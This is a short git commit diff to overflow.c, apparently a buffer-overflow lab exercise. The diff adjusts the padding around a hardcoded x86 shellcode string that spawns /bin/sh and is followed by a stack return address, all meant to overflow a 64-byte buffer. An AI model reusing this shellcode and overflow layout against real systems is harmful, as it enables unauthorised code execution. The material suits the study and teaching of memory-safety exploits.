7515909253192301afd51a75491e884a1d8f45fd
cal <callum.adair@outlook.com>
2023-05-02 16:20:56 +0100

    finalish form

--- overflow.c
+++ overflow.c
@@ -9,7 +9,7 @@ int main(char* argv[], int argc) {
         // gets(rand_str);
 
         //our malicious input will look something like this, containing 56 bad chars, so we need 12 padding chars minus one for the null terminator.
-        char rand_str[] = "aaaa"
+        char rand_str[] = ""
         "\xeb\x24\x5e\x89\x74\x24\x08\x31"
         "\xc0\x88\x44\x24\x07\x89\x44\x24"
         "\x0c\xb0\x0b\x89\xf3\x8d\x4c\x24"
@@ -17,7 +17,7 @@ int main(char* argv[], int argc) {
         "\xdb\x89\xd8\x40\xcd\x80\xe8\xd7"
         "\xff\xff\xff"
         "/bin/sh"
-        "bbbbbbb"
+        "aaaaaaaaaaa"
         "\x30\xe3\xff\xff\xff\x7f";
 
         char buff[64];
